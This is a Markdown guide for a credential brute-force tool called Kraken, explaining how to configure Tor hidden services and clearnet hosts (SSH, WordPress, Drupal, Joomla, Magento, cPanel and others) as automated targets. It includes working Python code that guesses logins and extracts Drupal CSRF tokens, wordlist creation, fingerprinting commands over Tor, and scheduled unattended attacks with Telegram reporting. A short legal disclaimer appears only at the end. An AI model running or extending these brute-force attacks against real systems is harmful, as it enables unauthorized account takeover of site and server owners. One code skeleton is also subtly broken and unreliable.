# Adding Non-WordPress Services to Kraken

This guide explains how to add different types of services (SSH, FTP, Telnet, etc.) to your `hidden_services.json` configuration file for automated scanning.

## Quick Reference

Currently, Kraken's automated mode supports:
- ✅ **WordPress** - Fully automated
- ✅ **SSH** - Fully automated

Other services from the original Kraken can be added as custom configurations (see below).

## Table of Contents

1. [Adding SSH Services](#adding-ssh-services)
2. [Adding Static PHP Sites and Web Frameworks](#adding-static-php-sites-and-web-frameworks)
3. [Understanding Service Configuration](#understanding-service-configuration)
4. [Available Service Types](#available-service-types)
5. [Custom Service Integration](#custom-service-integration)
6. [Examples for Different Services](#examples-for-different-services)

---

## Adding SSH Services

SSH is fully supported in automated mode. Here's how to add SSH targets:

### Basic SSH Configuration

```json
{
  "hidden_services": [
    {
      "name": "my_ssh_server",
      "url": "http://example.onion",
      "type": "ssh",
      "port": 22,
      "enabled": true,
      "comment": "SSH server on hidden service",
      "wordlists": {
        "users": "wordlists/users.txt",
        "passwords": "wordlists/passwords.txt"
      }
    }
  ]
}
```

### SSH on Non-Standard Port

```json
{
  "name": "ssh_custom_port",
  "url": "http://example.onion",
  "type": "ssh",
  "port": 2222,
  "enabled": true,
  "comment": "SSH on custom port 2222",
  "wordlists": {
    "users": "wordlists/ssh_users.txt",
    "passwords": "wordlists/ssh_passwords.txt"
  }
}
```

### SSH on Clearnet (Through Tor)

```json
{
  "name": "clearnet_ssh",
  "url": "http://example.com",
  "type": "ssh",
  "port": 22,
  "enabled": true,
  "comment": "Clearnet SSH server (traffic still goes through Tor)",
  "wordlists": {
    "users": "wordlists/users.txt",
    "passwords": "wordlists/passwords.txt"
  }
}
```

---

## Adding Static PHP Sites and Web Frameworks

While WordPress and SSH are fully automated, Kraken includes modules for many other web frameworks and CMSs that can be run manually or integrated into automated workflows.

### Static PHP Sites with Login Forms

For static PHP sites with custom login forms, you can use a generic web brute force approach:

#### Method 1: Manual Testing with cURL

First, inspect the login form to understand its structure:

```bash
# View the login page source
curl --socks5-hostname 127.0.0.1:9050 http://example.onion/login.php

# Look for:
# - Form action URL
# - Username field name (e.g., "username", "user", "login")
# - Password field name (e.g., "password", "pass", "pwd")
# - Hidden fields (CSRF tokens, etc.)
```

#### Method 2: Add as WordPress-like Target (If Compatible)

Some PHP sites use WordPress-like authentication. Try adding as WordPress first:

```json
{
  "name": "php_site_wp_style",
  "url": "http://example.onion",
  "type": "wordpress",
  "port": 80,
  "enabled": true,
  "comment": "PHP site with WordPress-compatible login",
  "wordlists": {
    "users": "wordlists/users.txt",
    "passwords": "wordlists/passwords.txt"
  }
}
```

#### Method 3: Custom Script for Static PHP

For custom PHP login forms, create a Python script based on the form structure:

```python
#!/usr/bin/env python3
# custom_php_bruteforce.py

import requests

def test_login(url, username, password, proxies):
    login_data = {
        'username': username,  # Adjust field name
        'password': password,  # Adjust field name
        'submit': 'Login'      # Adjust if needed
    }
    
    try:
        response = requests.post(
            f"{url}/login.php",  # Adjust login endpoint
            data=login_data,
            proxies=proxies,
            timeout=30
        )
        
        # Adjust success detection based on your site
        if "Dashboard" in response.text or "Welcome" in response.text:
            print(f"✓ SUCCESS: {username}:{password}")
            return True
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

# Usage
proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
test_login("http://example.onion", "admin", "password123", proxies)
```

### Popular Web Frameworks

Kraken includes interactive modules for these frameworks. Here's how to use them:

#### Drupal Sites

Drupal uses its own authentication system. To scan Drupal sites:

**Manual Execution:**

```bash
cd /opt/kraken
python3 files/drupal_bruteforce.py
# Follow prompts to enter:
# - Target URL: http://example.onion
# - Username list path
# - Password list path
# - Number of threads
```

**Configuration (For Future Automation):**

```json
{
  "name": "drupal_site",
  "url": "http://example.onion",
  "type": "drupal",
  "port": 80,
  "enabled": false,
  "comment": "Drupal site - currently requires manual execution",
  "wordlists": {
    "users": "wordlists/drupal_users.txt",
    "passwords": "wordlists/passwords.txt"
  }
}
```

**Drupal-Specific Tips:**
- Default login path: `/user/login`
- Common usernames: `admin`, `administrator`, `webmaster`
- Drupal has rate limiting - use slower threading

#### Joomla Sites

Joomla is another popular CMS with its own authentication.

**Manual Execution:**

```bash
cd /opt/kraken
python3 files/joomla_bruteforce.py
```

**Configuration (For Future Automation):**

```json
{
  "name": "joomla_site",
  "url": "http://example.onion",
  "type": "joomla",
  "port": 80,
  "enabled": false,
  "comment": "Joomla site - currently requires manual execution",
  "wordlists": {
    "users": "wordlists/joomla_users.txt",
    "passwords": "wordlists/passwords.txt"
  }
}
```

**Joomla-Specific Tips:**
- Default admin path: `/administrator`
- Common usernames: `admin`, `administrator`, `super`
- Check Joomla version for specific vulnerabilities

#### Magento E-commerce

Magento is an e-commerce platform with admin authentication.

**Manual Execution:**

```bash
cd /opt/kraken
python3 files/magento_bruteforce.py
```

**Configuration (For Future Automation):**

```json
{
  "name": "magento_shop",
  "url": "http://example.onion",
  "type": "magento",
  "port": 80,
  "enabled": false,
  "comment": "Magento e-commerce site",
  "wordlists": {
    "users": "wordlists/admin_users.txt",
    "passwords": "wordlists/ecommerce_passwords.txt"
  }
}
```

**Magento-Specific Tips:**
- Admin path varies: `/admin`, `/admin_xxx` (obfuscated)
- Use admin-focused username lists
- Often has strong rate limiting

#### PrestaShop E-commerce

PrestaShop is another e-commerce platform.

**Manual Execution:**

```bash
cd /opt/kraken
python3 files/prestashop_bruteforce.py
```

**Configuration (For Future Automation):**

```json
{
  "name": "prestashop_store",
  "url": "http://example.onion",
  "type": "prestashop",
  "port": 80,
  "enabled": false,
  "comment": "PrestaShop e-commerce platform",
  "wordlists": {
    "users": "wordlists/users.txt",
    "passwords": "wordlists/passwords.txt"
  }
}
```

**PrestaShop-Specific Tips:**
- Default admin path: `/admin` or `/admin[random]`
- Employee accounts are common
- Multi-shop setups may have multiple admin panels

#### OpenCart E-commerce

OpenCart is a lightweight e-commerce solution.

**Manual Execution:**

```bash
cd /opt/kraken
python3 files/opencart_bruteforce.py
```

**Configuration (For Future Automation):**

```json
{
  "name": "opencart_shop",
  "url": "http://example.onion",
  "type": "opencart",
  "port": 80,
  "enabled": false,
  "comment": "OpenCart e-commerce platform",
  "wordlists": {
    "users": "wordlists/users.txt",
    "passwords": "wordlists/passwords.txt"
  }
}
```

**OpenCart-Specific Tips:**
- Admin path: `/admin` (may be renamed)
- Simpler authentication than Magento
- Common in small to medium shops

#### WooCommerce (WordPress Plugin)

WooCommerce runs on WordPress, so use the WordPress module.

**Configuration:**

```json
{
  "name": "woocommerce_shop",
  "url": "http://example.onion",
  "type": "wordpress",
  "port": 80,
  "enabled": true,
  "comment": "WooCommerce shop (WordPress-based) - fully automated",
  "wordlists": {
    "users": "wordlists/wp_users.txt",
    "passwords": "wordlists/passwords.txt"
  }
}
```

**WooCommerce-Specific Tips:**
- Uses standard WordPress login at `/wp-login.php`
- Shop Manager and Administrator roles
- May have additional plugins requiring authentication

#### CPanel Web Hosting

CPanel is a popular web hosting control panel.

**Manual Execution:**

```bash
cd /opt/kraken
python3 files/cpanel_bruteforce.py
```

**Configuration (For Future Automation):**

```json
{
  "name": "cpanel_hosting",
  "url": "http://example.onion",
  "type": "cpanel",
  "port": 2083,
  "enabled": false,
  "comment": "CPanel hosting control panel (HTTPS usually 2083)",
  "wordlists": {
    "users": "wordlists/cpanel_users.txt",
    "passwords": "wordlists/passwords.txt"
  }
}
```

**CPanel-Specific Tips:**
- Default ports: 2082 (HTTP), 2083 (HTTPS)
- Login path: `:2083/login/`
- Often has account lockout after failed attempts
- System administrators and individual hosting accounts

### Framework Detection

Before scanning, identify the framework/CMS:

```bash
# Method 1: Check headers and HTML
curl --socks5-hostname 127.0.0.1:9050 -I http://example.onion

# Method 2: Look for framework-specific files
curl --socks5-hostname 127.0.0.1:9050 http://example.onion/wp-admin/  # WordPress
curl --socks5-hostname 127.0.0.1:9050 http://example.onion/administrator/  # Joomla
curl --socks5-hostname 127.0.0.1:9050 http://example.onion/user/login  # Drupal
curl --socks5-hostname 127.0.0.1:9050 http://example.onion/admin/  # Various

# Method 3: Use whatweb (if installed)
whatweb --proxy socks5://127.0.0.1:9050 http://example.onion
```

### Creating Custom Automated Modules

To integrate any of these frameworks into the automated system:

1. **Create an automated wrapper** (e.g., `files/drupal_bruteforce_auto.py`)
2. **Follow the pattern** from `wordpress_bruteforce_auto.py`
3. **Update `kraken_auto.py`** to handle the new service type

Example skeleton for Drupal automation:

```python
# files/drupal_bruteforce_auto.py

import requests
import logging
from datetime import datetime

class DrupalBruteForceAuto:
    def __init__(self, target, username_file, password_file, 
                 threads=10, timeout=30, proxies=None):
        self.target = target
        self.username_file = username_file
        self.password_file = password_file
        self.threads = threads
        self.timeout = timeout
        self.proxies = proxies or {}
        self.results = []
        
        self.session = requests.Session()
        self.session.proxies.update(self.proxies)
    
    def _validate_drupal(self):
        """Check if target is a Drupal site"""
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            # Look for Drupal-specific patterns
            if 'Drupal' in response.text or '/user/login' in response.text:
                return True
            return False
        except Exception as e:
            logging.error(f"Error validating Drupal site: {e}")
            return False
    
    def _attempt_login(self, username, password):
        """Attempt login with credentials"""
        login_url = f"{self.target}/user/login"
        
        # Get form build ID and other tokens
        try:
            # Step 1: Get login page to extract form tokens
            response = self.session.get(login_url, timeout=self.timeout)
            
            # Step 2: Extract form_build_id (Drupal CSRF protection)
            import re
            form_build_id = re.search(r'name="form_build_id" value="([^"]+)"', response.text)
            
            if not form_build_id:
                return False
            
            # Step 3: Submit login
            login_data = {
                'name': username,
                'pass': password,
                'form_build_id': form_build_id.group(1),
                'form_id': 'user_login_form',
                'op': 'Log in'
            }
            
            response = self.session.post(login_url, data=login_data, 
                                        timeout=self.timeout, allow_redirects=True)
            
            # Check for successful login
            if 'Log out' in response.text or '/user/' in response.url:
                logging.info(f"✓ SUCCESS: {username}:{password}")
                return True
            
            return False
            
        except Exception as e:
            logging.debug(f"Login attempt failed: {e}")
            return False
    
    def run(self):
        """Run the automated brute force attack"""
        logging.info(f"Starting Drupal brute force on {self.target}")
        
        if not self._validate_drupal():
            logging.error("Target is not a valid Drupal site")
            return []
        
        # Load wordlists and perform brute force
        # ... (implement similar to wordpress_bruteforce_auto.py)
        
        return self.results
```

Then update `kraken_auto.py`:

```python
def _run_drupal_attack(self, target):
    """Run Drupal brute force attack on hidden service"""
    from files.drupal_bruteforce_auto import DrupalBruteForceAuto
    
    logging.info(f"Starting Drupal attack on {target['name']}")
    self.telegram.report_scan_start(target['name'], target['url'])
    
    try:
        drupal_brute = DrupalBruteForceAuto(
            target=target['url'],
            username_file=target['wordlists']['users'],
            password_file=target['wordlists']['passwords'],
            threads=self.config.get("settings", {}).get("threads", 10),
            timeout=self.config.get("settings", {}).get("timeout", 30),
            proxies=self.proxies
        )
        
        results = drupal_brute.run()
        
        # Process and report results
        # ... (similar to WordPress handler)
        
        return results
        
    except Exception as e:
        logging.error(f"Error during Drupal attack: {e}")
        self.telegram.report_error(target['name'], str(e))
        return []

# In the run() method, add:
elif service_type == "drupal":
    self._run_drupal_attack(target)
```

### Summary of Web Framework Support

| Framework | Automated | Manual | Login Path | Notes |
|-----------|-----------|--------|------------|-------|
| WordPress | ✅ Yes | ✅ Yes | `/wp-login.php` | Fully automated |
| WooCommerce | ✅ Yes | ✅ Yes | `/wp-login.php` | WordPress-based |
| Drupal | ❌ No | ✅ Yes | `/user/login` | Manual only (can automate) |
| Joomla | ❌ No | ✅ Yes | `/administrator` | Manual only (can automate) |
| Magento | ❌ No | ✅ Yes | `/admin` | Manual only (can automate) |
| PrestaShop | ❌ No | ✅ Yes | `/admin*` | Manual only (can automate) |
| OpenCart | ❌ No | ✅ Yes | `/admin` | Manual only (can automate) |
| CPanel | ❌ No | ✅ Yes | `:2083/login` | Manual only (can automate) |
| Static PHP | ❌ No | ⚠️ Custom | Varies | Requires custom script |

---

## Understanding Service Configuration

Each service entry in `hidden_services.json` has these fields:

| Field | Required | Description | Example |
|-------|----------|-------------|---------|
| `name` | Yes | Unique identifier for this target | `"target_wordpress"` |
| `url` | Yes | Target URL (http:// or https://) | `"http://example.onion"` |
| `type` | Yes | Service type (wordpress, ssh, etc.) | `"wordpress"` |
| `port` | No | Port number (default depends on service) | `22` |
| `enabled` | No | Enable/disable this target (default: true) | `true` or `false` |
| `comment` | No | Optional note about this target | `"Production server"` |
| `wordlists` | Yes | Username and password lists | See below |

### Wordlists Configuration

```json
"wordlists": {
  "users": "wordlists/users.txt",
  "passwords": "wordlists/passwords.txt"
}
```

You can specify different wordlists for different targets:

```json
"wordlists": {
  "users": "wordlists/admin_users.txt",
  "passwords": "wordlists/weak_passwords.txt"
}
```

---

## Available Service Types

Kraken includes modules for many service types. Currently, only **WordPress** and **SSH** are fully automated.

### Fully Automated (Available Now)

| Service Type | Value | Default Port | Notes |
|--------------|-------|--------------|-------|
| WordPress | `"wordpress"` | 80/443 | Web application brute force |
| SSH | `"ssh"` | 22 | SSH server authentication |

### Original Kraken Modules (Interactive)

These services exist in Kraken but require manual execution:

| Service | Interactive Module | Default Port |
|---------|-------------------|--------------|
| FTP | `ftp_bruteforce.py` | 21 |
| Telnet | `telnet_bruteforce.py` | 23 |
| RDP | `rdp_bruteforce.py` | 3389 |
| CPanel | `cpanel_bruteforce.py` | 2083 |
| Drupal | `drupal_bruteforce.py` | 80/443 |
| Joomla | `joomla_bruteforce.py` | 80/443 |
| Magento | `magento_bruteforce.py` | 80/443 |
| OpenCart | `opencart_bruteforce.py` | 80/443 |
| PrestaShop | `prestashop_bruteforce.py` | 80/443 |
| WooCommerce | `woocommerce_bruteforce.py` | 80/443 |
| Kubernetes | `kubernetes_bruteforce.py` | 6443 |
| LDAP | `ldap_bruteforce.py` | 389 |
| VoIP | `voip_bruteforce.py` | 5060 |
| Office365 | `office365_bruteforce.py` | N/A |
| WiFi | `wifi_bruteforce.py` | N/A |

---

## Custom Service Integration

To add support for other service types (FTP, Telnet, etc.), you need to create automated wrapper modules similar to the existing ones.

### Option 1: Run Existing Modules Manually

You can still use the original Kraken modules interactively:

```bash
cd /opt/kraken
python3 files/ftp_bruteforce.py
# Follow interactive prompts
```

### Option 2: Create Automated Wrapper

To integrate a service into the automated system, create a wrapper module:

1. Copy the pattern from `files/wordpress_bruteforce_auto.py` or `files/ssh_bruteforce_auto.py`
2. Adapt it for your target service
3. Add support in `kraken_auto.py`

**Example structure for FTP:**

```python
# files/ftp_bruteforce_auto.py

import logging
from datetime import datetime

class FTPBruteForceAuto:
    def __init__(self, host, port=21, username_file, password_file, 
                 threads=10, timeout=30, proxies=None):
        self.host = host
        self.port = port
        # ... initialization
    
    def run(self):
        # ... brute force logic
        return self.results
```

Then update `kraken_auto.py`:

```python
def _run_ftp_attack(self, target):
    from files.ftp_bruteforce_auto import FTPBruteForceAuto
    # ... implementation
```

---

## Examples for Different Services

### Multiple WordPress Sites

```json
{
  "hidden_services": [
    {
      "name": "wordpress_blog",
      "url": "http://blog123.onion",
      "type": "wordpress",
      "port": 80,
      "enabled": true,
      "wordlists": {
        "users": "wordlists/wp_users.txt",
        "passwords": "wordlists/wp_passwords.txt"
      }
    },
    {
      "name": "wordpress_shop",
      "url": "http://shop456.onion",
      "type": "wordpress",
      "port": 80,
      "enabled": true,
      "wordlists": {
        "users": "wordlists/users.txt",
        "passwords": "wordlists/common_passwords.txt"
      }
    }
  ]
}
```

### Multiple SSH Servers

```json
{
  "hidden_services": [
    {
      "name": "ssh_server_1",
      "url": "http://server1.onion",
      "type": "ssh",
      "port": 22,
      "enabled": true,
      "wordlists": {
        "users": "wordlists/linux_users.txt",
        "passwords": "wordlists/ssh_passwords.txt"
      }
    },
    {
      "name": "ssh_server_2",
      "url": "http://server2.onion",
      "type": "ssh",
      "port": 2222,
      "enabled": true,
      "comment": "Custom SSH port",
      "wordlists": {
        "users": "wordlists/admin_users.txt",
        "passwords": "wordlists/weak_passwords.txt"
      }
    }
  ]
}
```

### Mixed Service Types

```json
{
  "hidden_services": [
    {
      "name": "target_wordpress",
      "url": "http://wp.onion",
      "type": "wordpress",
      "port": 80,
      "enabled": true,
      "wordlists": {
        "users": "wordlists/users.txt",
        "passwords": "wordlists/passwords.txt"
      }
    },
    {
      "name": "target_ssh",
      "url": "http://ssh.onion",
      "type": "ssh",
      "port": 22,
      "enabled": true,
      "wordlists": {
        "users": "wordlists/users.txt",
        "passwords": "wordlists/passwords.txt"
      }
    },
    {
      "name": "disabled_target",
      "url": "http://future.onion",
      "type": "wordpress",
      "port": 80,
      "enabled": false,
      "comment": "Will scan later"
    }
  ]
}
```

### Using Different Wordlists

```json
{
  "hidden_services": [
    {
      "name": "target_with_custom_lists",
      "url": "http://example.onion",
      "type": "wordpress",
      "enabled": true,
      "wordlists": {
        "users": "wordlists/custom_usernames.txt",
        "passwords": "wordlists/rockyou_top1000.txt"
      }
    },
    {
      "name": "target_with_default_lists",
      "url": "http://example2.onion",
      "type": "ssh",
      "enabled": true,
      "wordlists": {
        "users": "wordlists/users.txt",
        "passwords": "wordlists/passwords.txt"
      }
    }
  ]
}
```

### Web Frameworks and CMS Examples

Examples for various web frameworks (note: most require manual execution currently):

```json
{
  "hidden_services": [
    {
      "name": "wordpress_blog",
      "url": "http://blog.onion",
      "type": "wordpress",
      "port": 80,
      "enabled": true,
      "comment": "WordPress blog - fully automated",
      "wordlists": {
        "users": "wordlists/wp_users.txt",
        "passwords": "wordlists/passwords.txt"
      }
    },
    {
      "name": "woocommerce_shop",
      "url": "http://shop.onion",
      "type": "wordpress",
      "port": 443,
      "enabled": true,
      "comment": "WooCommerce (WordPress-based) - fully automated",
      "wordlists": {
        "users": "wordlists/wp_users.txt",
        "passwords": "wordlists/ecommerce_passwords.txt"
      }
    },
    {
      "name": "drupal_site",
      "url": "http://drupal.onion",
      "type": "drupal",
      "port": 80,
      "enabled": false,
      "comment": "Drupal CMS - requires manual execution (python3 files/drupal_bruteforce.py)",
      "wordlists": {
        "users": "wordlists/drupal_users.txt",
        "passwords": "wordlists/passwords.txt"
      }
    },
    {
      "name": "joomla_portal",
      "url": "http://joomla.onion",
      "type": "joomla",
      "port": 80,
      "enabled": false,
      "comment": "Joomla CMS - requires manual execution (python3 files/joomla_bruteforce.py)",
      "wordlists": {
        "users": "wordlists/joomla_users.txt",
        "passwords": "wordlists/passwords.txt"
      }
    },
    {
      "name": "magento_store",
      "url": "http://store.onion",
      "type": "magento",
      "port": 443,
      "enabled": false,
      "comment": "Magento e-commerce - requires manual execution (python3 files/magento_bruteforce.py)",
      "wordlists": {
        "users": "wordlists/admin_users.txt",
        "passwords": "wordlists/ecommerce_passwords.txt"
      }
    },
    {
      "name": "prestashop_store",
      "url": "http://prestashop.onion",
      "type": "prestashop",
      "port": 80,
      "enabled": false,
      "comment": "PrestaShop - requires manual execution (python3 files/prestashop_bruteforce.py)",
      "wordlists": {
        "users": "wordlists/users.txt",
        "passwords": "wordlists/passwords.txt"
      }
    },
    {
      "name": "opencart_shop",
      "url": "http://opencart.onion",
      "type": "opencart",
      "port": 80,
      "enabled": false,
      "comment": "OpenCart - requires manual execution (python3 files/opencart_bruteforce.py)",
      "wordlists": {
        "users": "wordlists/users.txt",
        "passwords": "wordlists/passwords.txt"
      }
    },
    {
      "name": "cpanel_hosting",
      "url": "https://cpanel.onion",
      "type": "cpanel",
      "port": 2083,
      "enabled": false,
      "comment": "CPanel control panel - requires manual execution (python3 files/cpanel_bruteforce.py)",
      "wordlists": {
        "users": "wordlists/cpanel_users.txt",
        "passwords": "wordlists/hosting_passwords.txt"
      }
    }
  ]
}
```

**Important Notes:**
- Set `"enabled": true` only for WordPress and SSH (fully automated)
- Keep other frameworks with `"enabled": false` as placeholders
- To scan non-automated frameworks, run their respective modules manually
- Future updates may automate additional frameworks

### Static PHP Site Example

For custom PHP sites, you may need to create a custom script:

```json
{
  "name": "custom_php_site",
  "url": "http://custom.onion",
  "type": "custom_php",
  "port": 80,
  "enabled": false,
  "comment": "Custom PHP login - requires custom script or manual testing",
  "wordlists": {
    "users": "wordlists/users.txt",
    "passwords": "wordlists/passwords.txt"
  },
  "custom_notes": {
    "login_path": "/login.php",
    "username_field": "username",
    "password_field": "password",
    "success_indicator": "Dashboard"
  }
}
```

---

## Wordlist Management

### Default Wordlists

Located in `/opt/kraken/wordlists/`:
- `users.txt` - Common usernames
- `passwords.txt` - Common passwords

### Creating Custom Wordlists

Create your own wordlists:

```bash
# Create custom username list
cat > /opt/kraken/wordlists/my_users.txt << EOF
admin
administrator
root
user
test
EOF

# Download popular wordlists
cd /opt/kraken/wordlists/
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -O top1000.txt
```

Then reference them in your config:

```json
"wordlists": {
  "users": "wordlists/my_users.txt",
  "passwords": "wordlists/top1000.txt"
}
```

### Framework-Specific Wordlists

Create targeted wordlists for different frameworks:

```bash
cd /opt/kraken/wordlists/

# WordPress usernames
cat > wp_users.txt << EOF
admin
administrator
wpadmin
wordpress
editor
author
EOF

# Drupal usernames
cat > drupal_users.txt << EOF
admin
administrator
webmaster
drupaladmin
siteadmin
EOF

# Joomla usernames
cat > joomla_users.txt << EOF
admin
administrator
super
joomla
manager
EOF

# E-commerce usernames (Magento, PrestaShop, OpenCart)
cat > ecommerce_users.txt << EOF
admin
administrator
storeowner
merchant
shopkeeper
manager
sales
EOF

# CPanel usernames
cat > cpanel_users.txt << EOF
root
admin
cpanel
webadmin
hosting
reseller
EOF

# Generic admin usernames
cat > admin_users.txt << EOF
admin
administrator
root
user
test
demo
guest
EOF
```

**Download Popular Wordlists:**

```bash
cd /opt/kraken/wordlists/

# SecLists - Common credentials
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt -O users_common.txt
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -O passwords_top10000.txt

# WordPress-specific
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt -O cirt_users.txt

# Weak passwords
cat > weak_passwords.txt << EOF
password
123456
admin
12345678
password123
admin123
root
letmein
welcome
qwerty
EOF
```

**Usage in Configuration:**

```json
{
  "hidden_services": [
    {
      "name": "wordpress_site",
      "type": "wordpress",
      "wordlists": {
        "users": "wordlists/wp_users.txt",
        "passwords": "wordlists/passwords_top10000.txt"
      }
    },
    {
      "name": "drupal_site",
      "type": "drupal",
      "wordlists": {
        "users": "wordlists/drupal_users.txt",
        "passwords": "wordlists/weak_passwords.txt"
      }
    },
    {
      "name": "magento_store",
      "type": "magento",
      "wordlists": {
        "users": "wordlists/ecommerce_users.txt",
        "passwords": "wordlists/passwords_top10000.txt"
      }
    }
  ]
}
```

---

## Enabling/Disabling Targets

### Temporarily Disable a Target

Set `enabled` to `false`:

```json
{
  "name": "temporary_disabled",
  "url": "http://example.onion",
  "type": "wordpress",
  "enabled": false,
  "comment": "Disabled for maintenance"
}
```

### Enable Multiple Targets

Set `enabled` to `true` for each target you want to scan:

```json
{
  "hidden_services": [
    {
      "name": "target1",
      "enabled": true,
      "...": "..."
    },
    {
      "name": "target2",
      "enabled": true,
      "...": "..."
    }
  ]
}
```

---

## Validation

After editing `hidden_services.json`, validate your configuration:

```bash
# Check JSON syntax
python3 -m json.tool /opt/kraken/hidden_services.json

# Test configuration loading
cd /opt/kraken
python3 -c "
import json
with open('hidden_services.json') as f:
    config = json.load(f)
    enabled = [t for t in config.get('hidden_services', []) if t.get('enabled', True)]
    print(f'Found {len(enabled)} enabled target(s)')
    for target in enabled:
        print(f\"  - {target.get('name')} ({target.get('type')}) at {target.get('url')}\")
"
```

---

## Testing

### Test a Single Target

To test a specific configuration without running all targets:

1. Disable all other targets:
```json
{
  "hidden_services": [
    {
      "name": "test_target",
      "enabled": true,
      "...": "..."
    },
    {
      "name": "other_target",
      "enabled": false,
      "...": "..."
    }
  ]
}
```

2. Run manually:
```bash
cd /opt/kraken
sudo python3 kraken_auto.py
```

3. Check results:
```bash
ls -la /opt/kraken/reports/
tail -f /opt/kraken/kraken_auto.log
```

---

## Troubleshooting

### Target Not Being Scanned

**Check 1:** Is `enabled` set to `true`?
```bash
grep -A 10 "my_target_name" /opt/kraken/hidden_services.json | grep enabled
```

**Check 2:** Is the service type supported?
```bash
# Currently only "wordpress" and "ssh" work in automated mode
grep '"type"' /opt/kraken/hidden_services.json
```

**Check 3:** Check logs for errors:
```bash
tail -100 /opt/kraken/kraken_auto.log | grep -i error
```

### Wordlist Not Found

**Error:** `File not found: wordlists/mylist.txt`

**Solution:** Check the path is relative to `/opt/kraken/`:
```bash
ls -la /opt/kraken/wordlists/mylist.txt
```

### Invalid JSON Syntax

**Error:** `json.JSONDecodeError`

**Solution:** Validate JSON syntax:
```bash
python3 -m json.tool /opt/kraken/hidden_services.json
# If valid, it will print formatted JSON
# If invalid, it will show the error
```

---

## Best Practices

### 1. Organize by Service Type

Group services by type for easier management:

```json
{
  "hidden_services": [
    // WordPress sites
    {
      "name": "wp_site1",
      "type": "wordpress",
      "...": "..."
    },
    {
      "name": "wp_site2",
      "type": "wordpress",
      "...": "..."
    },
    // SSH servers
    {
      "name": "ssh_server1",
      "type": "ssh",
      "...": "..."
    },
    {
      "name": "ssh_server2",
      "type": "ssh",
      "...": "..."
    }
  ]
}
```

### 2. Use Descriptive Names

Use clear, descriptive names:
```json
{
  "name": "prod_wordpress_blog",  // Good
  "name": "target1",              // Bad
}
```

### 3. Add Comments

Document your targets:
```json
{
  "name": "main_website",
  "comment": "Main production site - scan weekly",
  "...": "..."
}
```

### 4. Use Appropriate Wordlists

Match wordlists to target type:
- WordPress: Use WordPress-specific username lists (admin, administrator)
- SSH: Use system usernames (root, user, ubuntu)

### 5. Test Before Automating

Always test new targets manually before enabling automated scanning:

```bash
cd /opt/kraken
# Enable only test target
sudo python3 kraken_auto.py
# Check results
# Enable timer only after verification
```

---

## Complete Example Configuration

Here's a complete example showing various service types and configurations:

```json
{
  "hidden_services": [
    {
      "name": "wordpress_blog_onion",
      "url": "http://blogexample123.onion",
      "type": "wordpress",
      "port": 80,
      "enabled": true,
      "comment": "Personal blog on Tor",
      "wordlists": {
        "users": "wordlists/wp_users.txt",
        "passwords": "wordlists/common_passwords.txt"
      }
    },
    {
      "name": "wordpress_shop_clearnet",
      "url": "https://shop.example.com",
      "type": "wordpress",
      "port": 443,
      "enabled": true,
      "comment": "E-commerce site (clearnet through Tor)",
      "wordlists": {
        "users": "wordlists/users.txt",
        "passwords": "wordlists/rockyou_top1000.txt"
      }
    },
    {
      "name": "ssh_backup_server",
      "url": "http://backup.onion",
      "type": "ssh",
      "port": 22,
      "enabled": true,
      "comment": "Backup server - standard SSH port",
      "wordlists": {
        "users": "wordlists/linux_users.txt",
        "passwords": "wordlists/ssh_passwords.txt"
      }
    },
    {
      "name": "ssh_custom_port",
      "url": "http://server.onion",
      "type": "ssh",
      "port": 2222,
      "enabled": true,
      "comment": "SSH on custom port for security",
      "wordlists": {
        "users": "wordlists/admin_users.txt",
        "passwords": "wordlists/weak_passwords.txt"
      }
    },
    {
      "name": "future_target",
      "url": "http://future.onion",
      "type": "wordpress",
      "port": 80,
      "enabled": false,
      "comment": "Will enable after getting permission"
    }
  ],
  "_comment": "Remember: Only scan systems you own or have permission to test!"
}
```

---

## Next Steps

1. **Edit Configuration:**
   ```bash
   sudo nano /opt/kraken/hidden_services.json
   ```

2. **Validate Syntax:**
   ```bash
   python3 -m json.tool /opt/kraken/hidden_services.json
   ```

3. **Test Manually:**
   ```bash
   cd /opt/kraken
   sudo python3 kraken_auto.py
   ```

4. **Check Results:**
   ```bash
   tail -f /opt/kraken/kraken_auto.log
   ls -la /opt/kraken/reports/
   ```

5. **Enable Automated Scanning:**
   ```bash
   sudo systemctl enable kraken.timer
   sudo systemctl start kraken.timer
   ```

---

## Support

For more information:
- **Quick Start:** [QUICKSTART.md](QUICKSTART.md)
- **Full Documentation:** [README_HIDDEN_SERVICES.md](README_HIDDEN_SERVICES.md)
- **Security Guide:** [SECURITY.md](SECURITY.md)

---

## Legal Warning

⚠️ **IMPORTANT:** Only scan systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal.

---

**Last Updated:** 2023-11-16
